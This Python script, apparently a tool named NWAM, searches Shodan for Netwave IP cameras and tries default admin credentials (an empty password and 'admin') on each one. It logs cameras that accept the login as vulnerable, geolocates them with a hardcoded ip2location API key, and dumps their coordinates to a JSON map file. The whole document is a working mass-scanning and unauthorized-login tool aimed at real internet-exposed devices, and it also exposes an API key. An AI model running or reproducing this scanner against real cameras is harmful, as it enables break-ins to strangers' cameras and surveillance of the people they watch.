import shodan
import requests
import sys
import argparse
from multiprocessing import Process, Pool, Queue
from random import randrange
from time import sleep
import requests
import json

# Send a request to the IP to see if the default admin credentials work
def process_ip(ip, port, queue):
    try:
        reqa = requests.get("http://{}:{}/check_user.cgi".format(ip, port),
            auth=requests.auth.HTTPBasicAuth("admin", ""),
            timeout=5)
        reqb = requests.get("http://{}:{}/check_user.cgi".format(ip, port),
            auth=requests.auth.HTTPBasicAuth("admin", "admin"),
            timeout=5)

        # Check if authenticated
        if reqa.text[0] == "v" or reqb.text[0] == "v":
            queue.put(ip+":"+port)
        else:
            queue.put("Failed "+ip+":"+port)

    # Exceptions
    except KeyboardInterrupt:
        queue.put("F")
        print("Process interrupted.", file=sys.stderr)
        sys.exit(0)
    except Exception:
        queue.put("F")

if __name__ == "__main__":
    # json data for collecting lats and longs
    json_data = {"locations":[]}
    try:
        # Arguments
        parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
        parser.add_argument('key', help="Your Shodan API key")
        parser.add_argument('-q', metavar="options", help="Your Shodan query options (example: \"city:\\\"Chicago\\\"\")")
        parser.add_argument('-c', metavar="count", help="Amount of threads to use for mapping (default: 10)", type=int, default=10)
        parser.add_argument('-o', metavar="file", type=str, help="Output vulnerable IPs to file")
        parser.add_argument('--out-failed', metavar="file", type=str, help="Output IPs that failed to login to file")
        parser.add_argument('--silent', action="store_true", help="Silence all stdout output")
        parser.add_argument('--iponly', action="store_true", help="Output only vulnerable IPs to stdout")
        parser.add_argument('--about', help="About NWAM", action="store_true")
        args = parser.parse_args()
        if args.silent and args.iponly:
            print("--silent and --iponly are incompatible", file=sys.stderr)
            quit()
        
        if args.about:
            quit()

        # Output files
        if args.o:
            outfile = open(args.o, "a")
        if args.out_failed:
            outfailedfile = open(args.out_failed, "a")

        # NWAM Banner
        if args.silent == False and args.iponly == False:
            print("\n\n")

        # Connect to Shodan and setup the query string
        api = shodan.Shodan(args.key)
        searchstr = "Netwave"
        if args.q:
            searchstr += (" "+args.q)
            if args.silent == False and args.iponly == False:
                print("Searching with options: "+args.q)
        
        # Main loop
        curpage = 1

        while True:
            results = api.search(searchstr, page=curpage)
            if curpage == 1 and args.silent == False and args.iponly == False:
                print("Shodan returned {} results!\n".format(results["total"]))
            
            # Tone down the threads if not enough results
            if args.c > int(results["total"]):
                threads = int(results["total"])
            else:
                threads = args.c

            q = Queue()
            runningcount = 0
            processed = 0
            vulnerable = 0

            # Check if finished
            if len(results['matches']) == 0 and args.silent == False and args.iponly == False:
                print("Mapping done! Quitting...")
                quit()
            elif args.silent == False and args.iponly == False:
                print("Processing page {}...".format(curpage))

            # Loop through IPs
            for result in results['matches']:
                if runningcount < threads:
                    # Spawn processes
                    p = Process(target=process_ip, args=(result["ip_str"], str(result["port"]), q,))
                    p.start()
                    runningcount += 1
                else:
                    # Wait for a process to return
                    res = q.get(timeout=6)
                    if res[0] != "F":
                        if args.iponly and args.silent == False: print(res)
                        elif args.silent == False: print("[VULN] "+res)
                        if args.o: outfile.write(res+"\n")
                        vulnerable += 1
                        # find location data and output to json
                        end_idx = res.index(':')
                        payload = {'key': '7A31A4409EB96A8C6966833F42B5E570', 'ip': res[:end_idx], 'format': 'json'}

                        end_idx = res.index(':')
                        payload = {'key': '7A31A4409EB96A8C6966833F42B5E570', 'ip': res[:end_idx], 'format': 'json'}
                        api_result = requests.get('https://api.ip2location.io/', params=payload)
                        data = json.loads(api_result.text)
                        json_data["locations"].append({"url":"http://"+str(res), "lat":data["latitude"], "long":data["longitude"]})

                    elif args.out_failed and res != "F":
                        outfailedfile.write(res.split(" ")[1]+"\n")
                    processed += 1
                    # Then spawn the new process
                    p = Process(target=process_ip, args=(result["ip_str"], str(result["port"]), q,))
                    p.start()

            # Wait for the remaining processes to return
            while runningcount > 0:
                res = q.get(timeout=6)
                if res[0] != "F":
                    if args.iponly and args.silent == False: print(res)
                    elif args.silent == False: print("[VULN] "+res)
                    if args.o: outfile.write(res+"\n")
                    vulnerable += 1
                elif args.out_failed and res != "F":
                    outfailedfile.write(res.split(" ")[1]+"\n")
                processed += 1
                runningcount -= 1  

            if args.silent == False and args.iponly == False:
                print("Processed {} cameras, {} vulnerable.\n".format(processed, vulnerable))
            curpage += 1

    # Exceptions
    except shodan.APIError as e:
        print(e)
    except KeyboardInterrupt:
        print("SIGINT! Interrupting mapper...", file=sys.stderr)
        sys.exit(0)
    except Exception as e:
        print(sys.exc_info()[0].__name__)
    finally:
        dump_filename = 'coords.json'

        with open(dump_filename, 'w') as json_file:      
            json.dump(json_data, json_file, indent=4)
